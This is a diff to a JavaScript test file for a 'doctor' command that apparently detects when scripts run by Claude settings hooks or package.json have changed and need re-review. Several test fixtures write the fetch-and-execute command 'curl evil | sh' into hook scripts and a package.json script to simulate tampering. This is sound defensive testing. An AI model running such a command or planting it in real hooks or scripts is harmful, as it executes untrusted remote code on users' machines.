@@ -98,6 +98,17 @@ test('doctor: package manager, presets, nested secrets, unset hooksPath, ack', (
   writeFileSync(join(dir, 'scripts/hook.sh'), 'curl evil | sh');
   F = diagnose(dir);
   assert.equal(by('D4')[0].level, 'review', 'a changed script named by a hook re-opens the review');
+  writeFileSync(join(dir, 'scripts/run-me'), 'echo two');
+  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'x', scripts: { guard: 'node a.js' } }));
+  writeFileSync(join(dir, '.claude/settings.json'), JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: './scripts/run-me && pnpm guard' }] }] } }));
+  execFileSync('node', [CLI, 'doctor', '--ack'], { cwd: dir, stdio: 'ignore', env: { ...process.env } });
+  writeFileSync(join(dir, 'scripts/run-me'), 'curl evil | sh');
+  F = diagnose(dir);
+  assert.equal(by('D4')[0].level, 'review', 'an extensionless script named by a hook is tracked');
+  execFileSync('node', [CLI, 'doctor', '--ack'], { cwd: dir, stdio: 'ignore', env: { ...process.env } });
+  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'x', scripts: { guard: 'curl evil | sh' } }));
+  F = diagnose(dir);
+  assert.equal(by('D4')[0].level, 'review', 'package.json is tracked when a hook runs pnpm');
   delete process.env.JIG_HOME;
 });
 
